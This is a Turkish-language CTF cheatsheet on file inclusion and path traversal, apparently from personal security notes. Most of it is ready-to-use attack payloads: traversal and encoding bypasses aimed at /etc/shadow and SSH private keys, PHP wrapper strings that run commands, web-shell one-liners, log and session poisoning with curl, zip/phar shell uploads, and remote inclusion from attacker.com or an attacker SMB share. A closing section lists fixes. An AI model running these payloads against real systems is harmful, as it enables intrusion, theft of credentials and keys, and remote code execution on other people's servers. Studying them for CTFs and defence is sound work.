---
title: "File Inclusion & Path Traversal — CTF Cheatsheet"
date: 2026-09-29
tags: [web, lfi, rfi, path-traversal, cheatsheet]
---
# File Inclusion & Path Traversal — CTF Cheatsheet

## 1. Temel Kavramlar

| Tür                             | Açıklama                                                                                         |
| ------------------------------- | ------------------------------------------------------------------------------------------------ |
| **Path Traversal**              | `../` dizileri ile web kök dizini dışına çıkarak dosya okuma/yazma                               |
| **LFI (Local File Inclusion)**  | Kullanıcı girdisiyle sunucudaki yerel dosyaların include edilmesi; kod varsa **RCE**'ye yükselir |
| **RFI (Remote File Inclusion)** | Uzaktaki zararlı dosyanın include edilmesi; `allow_url_include=On` gerektirir                    |

**Kritik fark:** LFI dosyayı *include eder* (PHP kodu çalışır), path traversal sadece *okur* (kod çalışmaz).

---

## 2. LFI Tespiti

### Yaygın Parametre İsimleri
```
?page=  ?file=  ?path=  ?include=  ?view=  ?doc=  ?lang=  ?template=  ?load=
?cat=  ?dir=  ?action=  ?download=  ?folder=  ?inc=  ?content=  ?layout=
```

### Linux Hedef Dosyaları (öncelik sırası)
```
/etc/passwd              # İlk test — her zaman okunabilir
/etc/shadow              # Hash'ler (root gerekli)
/etc/hosts               # İç ağ keşfi
/proc/self/environ       # Ortam değişkenleri, bazen credential
/proc/self/cmdline       # Çalışan komut
/proc/self/fd/0-20       # Açık dosya tanımlayıcıları
/home/<user>/.ssh/id_rsa # SSH private key
/home/<user>/.bash_history
/root/.ssh/id_rsa
```

### Windows Hedef Dosyaları
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Users\<user>\.ssh\id_rsa
```

---

## 3. Path Traversal Bypass Teknikleri

### 3.1 Fazladan / Karışık Slash
```bash
..//..//
....//....//
..///..///
```
Sistem ardışık slash'ları tek slash gibi işler; naif filtre tam string eşleşmesi arıyorsa yakalayamaz.

### 3.2 Ters Slash (Windows)
```bash
..\..\
..\/..\/
```
Windows hem `/` hem `\` kabul eder.

### 3.3 URL Encoding
```bash
%2e%2e%2f%2e%2e%2f     → ../../
..%2f..%2f             → karışık
%2e%2e%5c              → ..\
```

### 3.4 Double URL Encoding
```bash
%252e%252e%252f   → ilk decode: %2e%2e%2f → ikinci decode: ../
```
Proxy + uygulama iki kez decode yapıyorsa kullanışlı.

### 3.5 Unicode / Overlong UTF-8
```bash
%c0%ae%c0%ae%c0%af   → overlong "../"
%e0%80%ae            → başka overlong varyant
```
Eski/gevşek decoder'ları kandırır.

### 3.6 Null Byte Injection (PHP < 5.3.4)
```bash
../../etc/passwd%00.jpg
```
String sonlandırmayı kandırır, uzantı kontrolünü atlatır.

### 3.7 "Strip Once" Hatası
```bash
....//....//    
```
Kod bir kez `../..` dizisini sildiğinde `....//` içinden bir sonraki `../`'yi bırakır.

### 3.8 Base Directory Breakout (Örnek Koddaki Açık)
```php
// Zafiyetli filtre:
if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
    include $_GET['page'];
}
```
**Payload:**
```bash
/var/www/html/..//..//..//etc/passwd
```
`..//..//` filtreden geçer çünkü tam olarak `../..` içermez, ama dosya sistemi `..//..//`'i `../../` gibi işler.

---

## 4. PHP Wrappers

### 4.1 php://filter — Kaynak Kod Okuma
```bash
?page=php://filter/convert.base64-encode/resource=index.php
```
Base64 decode edince PHP kaynak kodu elde edilir.

**Zincirleme (filtre bypass):**
```bash
?page=php://filter/read=string.toupper|string.rot13/resource=/etc/passwd
?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

### 4.2 php://input — POST Gövdesini Kod Olarak Çalıştırma
```bash
curl -X POST "http://target/?page=php://input" --data "<?php system('id'); ?>"
```
`allow_url_include` gerekir.

### 4.3 data:// — Inline Kod
```bash
?page=data://text/plain,<?php system($_GET['cmd']); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### 4.4 expect:// — Komut Çalıştırma
```bash
?page=expect://id
```
`expect` eklentisi gerekir.

### 4.5 phar:// / zip:// — Yüklenen Dosyayı Çalıştırma
```bash
# ZIP içine PHP shell koy, .jpg uzantısıyla yükle:
zip payload.zip payload.php
mv payload.zip shell.jpg
# Sonra:
?page=zip://shell.jpg%23payload.php
?page=phar://shell.jpg%23payload.php
```

### 4.6 /proc/self/environ
```bash
?page=/proc/self/environ
```
User-Agent'a PHP kodu enjekte edip include edilebilir (Log Poisoning alternatifi).

---

## 5. LFI → RCE Yükseltme

### 5.1 Log Poisoning
```bash
# 1. User-Agent'a PHP kodu enjekte et:
curl -A '<?php system($_GET["cmd"]); ?>' http://target/

# 2. Log dosyasını include et:
?page=/var/log/apache2/access.log&cmd=id
?page=/var/log/nginx/access.log&cmd=id
?page=/var/log/auth.log  # SSH username injection
```

### 5.2 PHP Session File Poisoning
```bash
# Session dosyası yolu:
/var/lib/php/sessions/sess_<PHPSESSID>
/tmp/sess_<PHPSESSID>

# Session değişkenine PHP kodu yaz (ör. kullanıcı adı alanına), sonra include et.
```

### 5.3 /proc/self/ Yöntemi
```bash
# Environ'a User-Agent ile kod enjekte et:
curl -A '<?php system("id"); ?>' http://target/
?page=/proc/self/environ

# Açık fd'leri tara:
?page=/proc/self/fd/0
?page=/proc/self/fd/1
...
```

### 5.4 Upload + LFI Zinciri
```bash
# 1. PHP shell'i .jpg olarak yükle (MIME kontrolünü geç)
# 2. LFI ile include et:
?page=../uploads/shell.jpg
```

### 5.5 phpinfo Race Condition
`phpinfo()` erişilebilir ve `file_uploads=On` ise, geçici dosya yolu tahmin edilerek RCE mümkün.

---

## 6. Blind Path Traversal

Dosya okunduğu halde içeriği görünmüyorsa PHP filter zincirleriyle sızıntı yapılabilir:

```bash
?page=php://filter/convert.base64-encode/resource=/etc/passwd
```

`dechunk` + `convert.iconv` kombinasyonlarıyla karakter karakter sızıntı (error oracle tekniği).

---

## 7. Log Poisoning Detay

1. **Inject:** User-Agent, Referer, URL, veya SSH username üzerinden PHP kodu log dosyasına yazılır.
2. **Include:** LFI ile log dosyası çağrılır.
3. **Execute:** PHP kodu çalışır, RCE elde edilir.

**Yaygın log yolları:**
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/sshd.log
```

---

## 8. Hızlı Referans Tablosu

| Senaryo | Payload |
|---------|---------|
| Temel LFI | `../../../etc/passwd` |
| Filtre `../..` engelliyor | `..//..//..//etc/passwd` |
| Windows | `..\..\..\windows\win.ini` |
| URL encode | `%2e%2e%2f%2e%2e%2f` |
| Double encode | `%252e%252e%252f` |
| Null byte (eski) | `../../etc/passwd%00.jpg` |
| Kaynak kod | `php://filter/convert.base64-encode/resource=index.php` |
| POST kodu | `php://input` + POST body |
| Inline kod | `data://text/plain,<?php ... ?>` |
| Log poisoning | UA'ya PHP + `/var/log/apache2/access.log` |
| Session | `/var/lib/php/sessions/sess_<id>` |
| Upload zinciri | `.jpg` uzantılı shell + LFI include |

---

## 9. RFI Notları

- **Koşul:** `allow_url_include = On` (PHP'de varsayılan **Off**).
- **Payload:** `?page=http://attacker.com/shell.txt`
- **SMB (Windows):** `?page=\\attacker\share\shell.php`
- RFI varsa doğrudan RCE — LFI zincirine gerek yok.

---

## 10. Savunma / Fix Özeti

- Kullanıcı girdisini dosya yolunda **kullanma**.
- Zorunluysa **allowlist** kullan (`in_array($page, ['home','about'])`).
- `basename()` ile dizin bileşenlerini temizle.
- `open_basedir` ile PHP'yi kısıtla.
- `allow_url_include=Off` (RFI'yi öldürür).
- Hassas dosyaları web kökü dışında tut.

---

**Up:** [Home](../Home.md)
**Related:** [Path traversal saldırılarında karşılaşılan zorluklar](Path%20traversal%20saldırılarında%20karşılaşılan%20zorluklar.md) · [linux Privesc basic adımları](../linux%20Privesc%20basic%20ad%C4%B1mlar%C4%B1.md)
